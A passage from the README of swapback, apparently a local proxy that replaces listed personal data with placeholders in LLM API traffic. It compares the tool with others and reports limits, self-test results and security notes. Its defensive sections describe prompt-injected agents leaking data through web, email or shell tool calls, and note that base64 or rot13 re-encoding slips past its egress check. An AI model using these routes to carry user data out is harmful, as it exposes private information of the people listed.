| Stack | Python 3.11+, about 5,200 lines (260 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
| Needs an ML model | No | Yes: GLiNER for names and places ([docs][pg-sem]) | Ships a local ONNX NER model | Optional: 46 MB ONNX NER | Optional: pluggable regex, NER or LLM detectors; exact-match needs none | Yes: local ONNX model, 26 PII types |
| Your own list of values | Yes: a YAML/JSON file you write (or build from a vCard/CSV export), typed, reloaded live | Yes: `denylist` patterns ([docs][pg-mask]) | Yes: custom words and regexes | Yes: seeded from your databases, fixtures, git history and schemas | Yes: `ExactMatchDetector` | Custom regex rules |
| Stand-ins | Typed placeholders (`«EMAIL_1»`) | Placeholders | Unclear | Pseudonyms | Typed placeholders (`<<EMAIL:1>>`) | Realistic dummy values |
| Restores values in replies | Yes, byte-exact as written | Yes ("supported placeholders") | Yes | Yes | Yes | Yes |
| Streaming restore | OpenAI Chat and Responses, Anthropic Messages SSE | Yes | Yes (SSE) | Yes for the clients it lists (Claude Code, Codex on Responses, Bedrock event streams) | Unclear | Unclear |
| Tool-call arguments | Real values for local tools; placeholders kept for web, shell and send-style tools and any call with a URL, by default; `tool_restore` allow/deny lists | Unclear | Unclear | Per-tool policy: web tools, unknown tools and network commands get pseudonyms (stricter default than swapback's); restored values escaped for shells and file types | Restored for tools (LangChain middleware); per-tool policy unclear | Unclear |
| On a scrub error | Fails closed (`503`) + egress re-check | Unclear | Unclear; documents a passthrough that forwards plaintext when masking is off or the app exits | Fails closed (`502`) + a second guard on the outgoing bytes (plain, encoded, transformed, truncated) | Unclear | Unclear |
| Tool-call egress policy (a prompt-injected `web_fetch`/`send_email` can't carry real values out) | Yes, default on, by tool-name globs for any agent; streamed tool arguments held until the call is complete | Unclear | Unclear | Yes, built around coding-agent tools and shell commands | Unclear | Unclear |
| OpenAI Responses API streams restored | Yes (`/v1/responses`, Codex) | Unclear | Unclear | Yes (Codex CLI) | Unclear | Unclear |
| Encoded spellings checked before sending | `\uXXXX`/`\n` escapes, nested JSON, HTML entities, `%XX`, `+` for space, NFD, zero-width, fullwidth; not base64 or shell transforms | Unclear | Unclear | Yes, wider: a 21-transform bypass matrix (byte dumps, base64, rot13, ...) in its regression suite | Unclear | Unclear |
| Fails closed on an empty or shrunk list, or a listed value left after the swap | Yes: blocks (empty), keeps old values + warns (shrunk), egress re-check in every spelling above | Unclear | Unclear | Fails closed on errors and leftovers; list-shrink guard unclear | Unclear | Unclear |
| Leak test you can re-run | `swapback selftest`: one command after `pip install`, made-up data in the package, 5 s, prints the numbers above | No | No | Yes: bypass matrix and leak checks in its test suite, with real-traffic numbers in its README | No | No |
| APIs | OpenAI Chat and Responses, Anthropic Messages (JSON and streaming) | OpenAI Chat + Responses, Anthropic, Codex | OpenAI, DeepSeek, Anthropic | Anthropic Messages, OpenAI Chat + Responses, Bedrock, Vertex, more | OpenAI and Anthropic connectors; LangChain, Pydantic AI, LlamaIndex, Claude Code integrations | OpenAI; Anthropic named in its diagram |
| Beyond text | No; [hooks](#hooks) for spend caps and local fallback | Browser extension, dashboard, route-to-local-LLM mode | Image/PDF OCR redaction, browser extension, dashboard | Encrypted vault, DB seeding, shell-safe escaping, MCP DB tool | Agent-framework middleware, chat UI example | Desktop UI, Chrome extension |

**Where swapback fits:** a personal or business agent of any kind (not only a coding agent) whose sensitive data is a
list you can write down: your family, your contacts, your clients, your IDs. You want one small proxy you can read in
an afternoon, that works with whatever client or framework you use as long as it speaks one of the three APIs, never
needs a model, restores the exact original text where your tools need it, keeps placeholders where a tool could send
it out, and blocks rather than leaks. **Where others are stronger:** names you never listed (PasteGuard, Maskit and
Kiji, and the optional NER in Veil and piighost); coding agents on production data (Veil: database seeding, shell-safe
escaping, a wider transform-bypass suite, a stricter tool default, Bedrock and Vertex); images and documents (Maskit);
framework middleware (piighost); a desktop app (Kiji).

[pg]: https://github.com/sgasser/pasteguard
[pg-mask]: https://pasteguard.com/docs/concepts/mask-mode
[pg-sem]: https://github.com/sgasser/pasteguard#how-detection-works
[mk]: https://github.com/xiaYuTian11/maskit
[vl]: https://github.com/lemonadesaltbagel/veil
[ph]: https://github.com/Athroniaeth/piighost
[kj]: https://github.com/dataiku/kiji-proxy

## Limits

### What it doesn't catch yet

Checked against 0.3.0 with nothing listed in `known.yaml`:

- **Names you haven't listed.** There is no NER model, so "Priya Raman" in free text goes out as written.
- **Dates of birth, unless right after an English label.** `Date of birth: 14/03/1987`, `DOB 1987-03-14` and
  `born on March 14, 1987` are caught. `Birthdate`, `DOB = …`, `born 21 March 1981`, other languages and unlabelled
  dates are not.
- **National IDs other than the US SSN.** UK National Insurance, Canadian SIN, Indian Aadhaar and PAN, passport and
  driving licence numbers pass through.
- **Most addresses outside the US street format.** A "number, street name, suffix" line is caught (`10 Downing Street`);
  postcodes, cities, PO boxes and formats like `Calle Mayor 5` or `12 rue de Rivoli` are not.
- **Free-form secrets and other identifiers.** Passwords, recovery codes, medical record numbers and coordinates are
  missed unless a rule covers them.
- **Other streaming formats.** Legacy chat `function_call` deltas (the pre-tools format), Gemini's native API and
  other provider-specific streams pass through with their placeholders. OpenAI chat, OpenAI Responses and Anthropic
  Messages streams are restored.

Listing a value in `known.yaml` or `private_terms.yaml` covers any of these. The details:

- **No NER.** It swaps what you list and what the patterns match. A name you never listed, written in free text, goes
  out as written. Keep the known-values file current.
- **Pattern coverage is what the rules cover.** Phone numbers, emails, cards (Luhn), IBANs, US SSNs, IPs, profile URLs,
  common API keys and a few local rules. National IDs other than the US SSN, free-form addresses, dates of birth in
  most label forms and many other formats are not detected unless you list them. See the measured score below.
- **Whole words, case-insensitive.** `Jane` does not match `Janet`. Separator and case variants of a listed multi-word
  value are caught (see How it works), and so are its JSON-escaped (`S\u00f8ren`), HTML-entity, `%XX`, form-encoded
  (`+`), NFD, zero-width and fullwidth spellings; nicknames, misspellings and other spellings need their own entries.
  Base64, hex, rot13 and similar re-encodings are out of scope: a listed value written that way is not caught, and an
  agent that runs a shell can produce them (Veil's transform matrix covers more of this). Commas and newlines also separate the parts of a
  listed address, so the same address written over two lines is caught.
- **Names that are ordinary words.** A listed name of two or more words that are all English dictionary words ("Will
  Hunt", "Drew Wells", "Jack Frost", also "John Brown"), or a one-word name on the short common-name list ("Rose"), is
  swapped only when every word is capitalised, so "I will hunt for the keys" and "she drew wells" are left alone; a
  lower-case "drew wells" that really is the person is then not swapped, and not blocked by the re-check either.
  Nor are its words joined across a sentence end, a blank line or separate HTML block elements ("Saving Grace. Fields
  of gold", `<p>Grace</p><p>Fields of gold</p>`); a single `<br>` or an inline tag between them still counts as one
  name, and so do two neighbouring blocks (`<td>`, `<th>`, `<li>`, `<div>`, `<p>` ...) that each hold exactly one word
  when those two words are the listed name, wherever the pair sits in the row or list and whatever the cells around it
  hold, their attributes or the whitespace between them (`<tr><td>17</td><td>Grace</td><td>Fields</td><td>Denver</td></tr>`,
  a header row above it, list items, divs). Not across a row or list boundary (`</tr><tr>`, `</ul><ul>`). Such a pair
  is swapped even when it is not the person: a menu `<div>Grace</div><div>Fields</div><div>Pricing</div>` is swapped
  too (the restore puts it back). The
  word list is SCOWL size 50 (64k lower-case words, shipped gzipped in the package). `check-config` lists these names. Set `common_names_title_case: false` to
  match them in any case (and accept the false positives).
- **Variants and restore.** All written variants of one listed value share one placeholder. A reply gets back the forms
  written in the same request, in order of occurrence; a reply with more mentions than the request reuses the last one.
  With no request context (`restore_text` on its own, the CLI) the spelling from your known file comes back.
- **Streaming.** OpenAI `chat.completion.chunk`, OpenAI Responses API (`/v1/responses`, as used by Codex) and Anthropic
  Messages streams are restored. Anthropic `thinking` deltas are left as sent, since they are signed. Other streams pass
  through with placeholders left in. When a held-back piece is sent as an extra Responses delta, later
  `sequence_number`s are shifted so they stay unique and increasing. Non-streaming JSON replies of any shape are restored. The restore holds back at most one partial
  placeholder (up to 24 characters) per stream, so chunks can arrive slightly regrouped; the text is unchanged.
- **JSON bodies only.** Multipart uploads and binary bodies pass through untouched; `data:` URLs (images) are not scanned.
  Token-id inputs to embeddings and completions are blocked, since they cannot be checked.
- **The tool policy is a heuristic.** It reads tool names and looks for URLs. A tool with a harmless name that still
  sends data out (say `notes_sync` posting to a server) gets real values unless you `deny` it or set
  `default: keep`. A value can also leave through a tool that writes a file which something else uploads later.
- **The model sees placeholders.** Answers that depend on the real value (spell this name, count the digits) will be
  wrong or vague.
- **One vault, one machine.** Placeholders are stable across all conversations on one machine. It is a single-process
  tool meant to run next to the client on loopback.

## Leak test (`swapback selftest`)

```bash
swapback selftest          # or: swapback selftest --json
```

It needs no config, key or network. A recording fake model and the proxy start on loopback ports with a fixed list of
made-up values shipped in the package: 15 names (5 with accents, 6 made only of ordinary words), 4 emails, 7 phones
(US, India, UK, Australia, Germany, France), 4 IDs and 4 addresses (one of them multi-line). Each value is sent in 4–14 written forms (as
written, upper case, surname first, accent-free, hyphen variants, other phone groupings, glued extensions, compact IDs, two-line addresses, address lines joined by `<br>` or by a tag plus a line break, and the
encoded forms: `quote_plus` URL/form encoding, `+` or `/` between words, decomposed accents (NFD), a zero-width space
inside a word, fullwidth digits) through 7 paths: OpenAI chat, chat streamed, chat with the value in tool-call
arguments and a `json.dumps` tool result, Anthropic streamed, Anthropic `tool_use`/`tool_result`, Responses streamed
and Responses `function_call`/`function_call_output`. The fake model echoes the user text, so the round trip is checked
too: forms written as plain text must come back byte for byte; `%XX`-encoded forms come back as the same value in its
decoded spelling. The leak check does not use swapback's matcher: it decodes JSON (nested), `\uXXXX`, HTML entities,
`%XX` and `+` on the model side, removes zero-width characters, applies NFKD (accents, fullwidth), folds case, and looks
for each value's name words, email, phone digits, ID characters and street line. It also runs the egress re-check on
its own, with the swap switched off, on every form as text, as a `json.dumps` tool result and as JSON inside JSON.

0.4.9 on Python 3.11:

```text
swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 requests (7.8 s)
  listed values caught (no form reached the model): 34/34 (100.0%)
  forms leaked to the model:                        0 of 1799 sent
  egress re-check alone (swap off) sees the form:   771/771 (100.0%)
  skeleton layer alone (no matcher rules) sees it:  514/514 (100.0%)  (reported; ordinary sentences it flags: 0)
  ordinary sentences left untouched:                57/57 (100.0%)
  exact round trips:                                1694/1694 (100.0%)
  JSON-in-JSON multi-line restores, valid + exact:  58/58 (100.0%)
  JSON in a ```json fence / inline / pasted, valid:  87/87 (100.0%)
  addresses joined by <br>\n etc. in JSON, swapped:  60/60 (100.0%)  (leaked: 0)
  doubly escaped placeholders in tool args restored: 68/68 (100.0%)
  JSON nested 1-8 levels, every level valid + exact: 96/96 (100.0%)
  nested 9+ levels (256+ backslashes), blocked:      10/10 (100.0%)  (16-level body: 0.00 s)
  dictionary-word names across sentences/HTML blocks: 7/7 (100.0%)
  missing/broken config file, one readable line:     3/3 (100.0%)
  tool args, mixed escaping, 1-8 inner levels valid: 96/96 (100.0%)
  \u00ab-escaped placeholders in text JSON restored: 6/6 (100.0%)
  dictionary-word names in one-word HTML cells:      7/7 (100.0%)
  bad listen / port in use, one readable line:       3/3 (100.0%)
  names in one-word cells anywhere in a row/list:    194/194 (100.0%)
  example placeholders unassigned, broken YAML said: 3/3 (100.0%)
  200 KB %XX body checked in:                       0.57 s
  health: blocked when the list breaks, known count: 5/5 (100.0%)
  %XX-encoded forms back as the same value, decoded: 105/105 (100.0%)
  unlisted values caught by the pattern detectors:  6/8 (75.0%)  (reported, not a pass condition; names are never caught without a list)
PASS
```

The 0.4.9 selftest adds the review #9 forms: a listed dictionary-word name split across one-word cells or blocks in
21 layouts (a third cell after the name, a First/Last/City header row, a leading id or word cell, pretty-printed rows,
`class=` attributes, two data rows, three `<li>` or `<div>` items, `<p>` blocks in an email, mixed case), as text, a
JSON tool result and an HTML email in JSON (the name must not reach the model), ordinary one-word blocks and a pair
split across two rows (left alone), the system note's example placeholders (slot 0, never assigned, so a reply that
copies them gets no real value), and a known file with broken YAML (the error says so). The 0.4.8 selftest added the review #8 forms: tool-call arguments with mixed escaping (the outer level ASCII-escaped
around raw inner JSON, the other way round, and alternating), 1 to 8 inner levels, plain and streamed (every level
must parse and the value come back exact); `\u00ab`-escaped placeholders in a text reply (a ```json fence, inline
JSON, two levels; restored) and in prose outside JSON (left as written); a dictionary-word name whose words each fill
one HTML block (a first/last-name table row, list items, divs: swapped) next to ordinary block text (left alone); and
a bad `listen` value and a port already in use (one readable line each). The 0.4.7 selftest added the review #7 forms: a multi-line address, a tab-joined name and an accented name inside JSON
nested 1 to 8 levels deep (`json.dumps` of `json.dumps` ...), each restored plain and streamed (every level must parse,
ASCII values byte for byte), the same values nested 9, 10 and 12 levels deep and a large 16-level body (all
must be blocked, the large one fast), a dictionary-word name next to a sentence end, a blank line and separate HTML
elements (left alone) or an inline tag and `<br>` (swapped), and a missing, broken and non-mapping config file (one
readable error line each). The 0.4.6 selftest added the review #6 forms: a listed multi-line address with its lines joined by `<br>\n`, `<br />\n`,
`<br/>\r\n` or `</p>\n<p>`, sent through the 7 paths and as a `json.dumps` tool result, tool-call arguments in the
history and a literal `\n` four JSON string levels deep (all must be swapped, not blocked), and placeholders the
model writes ASCII-escaped inside a JSON string inside tool-call arguments (`\\u00ab…\\u00bb`), which must be
restored with both JSON levels valid. The 0.4.5 selftest added the review #5 forms: a multi-word name written as path segments (`A/B/C`,
`/Users/A/B/notes.txt`), addresses with lines joined by `<br>`, multi-line values restored into JSON inside a ```json
fence, inline in a sentence and pasted with `\n` escapes, a timed 200 KB `%XX` body, and health's `known` count. The
0.4.4 selftest added the review #4 forms (a listed phone with `x22`/`ext9`/letters glued on, after `Mob`, in a
host-less URL path; a hyphenated name with the hyphen as a space or as nothing, also surname first; ALL-CAPS headings
as ordinary sentences), a JSON-inside-JSON restore of multi-line values, and a health check while the list file is
deleted and broken. "Skeleton layer alone" runs only the matcher-free part of the re-check; the forms it does not
cover by design (lower-case and ALL-CAPS dictionary-word names) are not sent.

## Performance

Measured by `tests/test_latency.py` on a synthetic chat request of about 19,000 characters with 13 messages, on a
laptop CPU (AMD Ryzen 7 4700U, Python 3.13):

| | median | max (20 runs) |
|---|---|---|
| first time a text is seen (cold) | 7.1 ms | 10.1 ms |
| repeated text (cached, typical for a growing chat history) | 0.13 ms | 0.14 ms |

Large encoded bodies are checked in linear time: a 200 KB body of `%XX`, base64, form data or HTML entities takes
0.1–0.7 s (0.4.4: 18 s for 48 KB of `%41`, over 100 s for a 165 KB form body), and `/scrubber/health` keeps answering
meanwhile (0.02 s worst case while a 165 KB form body was checked).

## Security notes

- The proxy listens on loopback and refuses other addresses unless you set `allow_remote: true`. It has no
  authentication of its own; anything that can reach the port can use it.
- Your provider key passes through in the `Authorization` header and is not stored.
- The vault (`vault.json`) holds the real values in plain JSON, readable only by your user (`0600`). Treat the state
  directory as sensitive.
- Tool calls that look like network or shell egress, or carry a URL, keep placeholders by default, so a prompt-injected
  model cannot have your client send real values out through them. See [Tool calls](#tool-calls).
- The request log records counts and types per request, never values.
- `X-Scrubber-Raw: 1` returns the provider's answer without the restore. The canary uses it to prove what the provider saw.
- Report vulnerabilities privately; see [SECURITY.md](https://github.com/rmpmrepo1278/swapback/blob/main/SECURITY.md).

## Detection score (patterns only)

`evals/holdout3.json` holds 64 synthetic cases (invented values only): 42 with something to catch, 22 that must pass
untouched. `python evals/run_holdout.py` scores the pattern detectors with **no known values listed**, so it measures
what the scrubber finds on its own. A case counts as caught only if every character of the expected value is swapped.
These numbers are not tuned to the holdout; the 0.1.1 rules are generic (bracketed at/dot emails, full-width `＠` and
zero-width characters in emails, IPv6).

| Category | 0.1.0 | 0.1.1 to 0.2.1 |
|---|---|---|
| EMAIL | 1/5 | 5/5 |
| IP address | 2/4 | 4/4 |
| SSN | 2/2 | 2/2 |
| PHONE | 2/5 | 2/5 |
| ADDRESS | 2/6 | 2/6 |
| SECRET (keys, passwords, passport/licence IDs) | 1/9 | 1/9 |
| DATE OF BIRTH | 0/5 | 0/5 |
| PERSON (no NER, by design) | 0/6 | 0/6 |
| **All 42 positives** | **10/42** | **16/42** |
| Negatives left untouched | 22/22 | 22/22 |
| Round trip exact | 64/64 | 64/64 |

Read it plainly: with nothing listed, the patterns catch well-formed contact data and miss most free-form secrets,
names, dates of birth and non-US addresses. The two phone misses are UK fictional-range numbers (07700 900xxx) that
the phone library rejects as invalid. **List what matters to you in `known.yaml` and `private_terms.yaml`;** listed
values are caught in every written variant above.

## Development

```bash
pip install -e ".[test]"
pytest -q                      # the full suite, including the holdout score as a regression floor
python evals/run_holdout.py    # the table above (--misses lists the cases not caught)
python examples/smoke.py       # end-to-end: mock upstream + proxy, plain and streamed
```

The vendored rule sets live
in `swapback/vendor` (see `THIRD_PARTY_NOTICES.md`); `tools/build_vendor.py` regenerates the Presidio patterns.

See [CONTRIBUTING.md](https://github.com/rmpmrepo1278/swapback/blob/main/CONTRIBUTING.md) and the [changelog](https://github.com/rmpmrepo1278/swapback/blob/main/CHANGELOG.md).

## Roadmap

- ~~Restore Anthropic Messages streams.~~ Done in 0.1.1.
- ~~Catch separator and case variants of listed values (NBSP, `.`, `_`, `-`, `%20`, all caps) under one placeholder.~~
  Done in 0.1.1.
- ~~Restore OpenAI Responses API streams.~~ Done in 0.3.0.
- ~~Keep placeholders in tool calls that could send data out.~~ Done in 0.3.0.
- ~~Build the known-values file from a contacts export.~~ Done in 0.3.0 (`swapback known init`).
- Optional, pluggable NER for names you never listed, off by default.
- More national ID and address patterns, with tests from synthetic data.
- ~~Release on PyPI.~~ Done: `pip install swapback`.
- ~~Hooks for spend caps, local fallback and usage accounting.~~ Done in 0.4.0.
- ~~A public, re-runnable leak test.~~ Done in 0.4.2 (`swapback selftest`).

Ideas and pull requests are welcome; open an issue first for anything large.

## License

MIT, see [LICENSE](https://github.com/rmpmrepo1278/swapback/blob/main/LICENSE). Bundled rule data: gitleaks (MIT) and Microsoft Presidio (MIT), see
[THIRD_PARTY_NOTICES.md](https://github.com/rmpmrepo1278/swapback/blob/main/THIRD_PARTY_NOTICES.md).
